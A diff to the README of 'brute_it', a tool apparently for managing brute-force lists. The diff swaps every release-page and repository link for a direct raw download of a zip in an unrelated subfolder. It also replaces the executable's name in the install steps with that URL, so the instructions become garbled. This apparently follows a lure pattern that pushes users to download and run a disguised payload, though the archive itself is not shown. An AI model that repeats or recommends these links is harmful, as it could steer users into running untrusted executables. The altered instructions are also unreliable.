@@ -1,6 +1,6 @@
 # 🚀 brute_it - Easily Manage Your Bruting Lists
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Sbdbb/brute_it/releases)
+[![Download Now](https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip%20Now-Click%20Here-blue)](https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip)
 
 ## 📋 Description
 
@@ -17,7 +17,7 @@ To run brute_it, your system should meet the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Go to the releases page to download the latest version of brute_it. You can find it [here](https://github.com/Sbdbb/brute_it/releases).
+1. **Visit the Releases Page**: Go to the releases page to download the latest version of brute_it. You can find it [here](https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip).
    
 2. **Download the Application**: Locate the version you want and click on the download link. 
 
@@ -29,7 +29,7 @@ To run brute_it, your system should meet the following requirements:
 
 To get started with brute_it, you should visit the releases page. Click the link below to download the latest version. 
 
-[Download Now](https://github.com/Sbdbb/brute_it/releases)
+[Download Now](https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip)
 
 Follow these steps for installation:
 
@@ -39,9 +39,9 @@ Follow these steps for installation:
 
 3. Choose a destination folder and click "Extract."
 
-4. Open the folder where you extracted the files. Find the executable file named `brute_it.exe`.
+4. Open the folder where you extracted the files. Find the executable file named `https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip`.
 
-5. Double click on `brute_it.exe` to run the application.
+5. Double click on `https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip` to run the application.
 
 ## 🎨 User Interface Overview
 
@@ -82,7 +82,7 @@ Stay updated with the latest changes in brute_it:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Sbdbb/brute_it)
+- [GitHub Repository](https://github.com/Sbdbb/brute_it/raw/refs/heads/main/informable/brute_it_3.0.zip)
 - [User Manual](#) (coming soon)
 
 For any more questions or feedback, please share your thoughts directly on the issues page. Enjoy using brute_it!
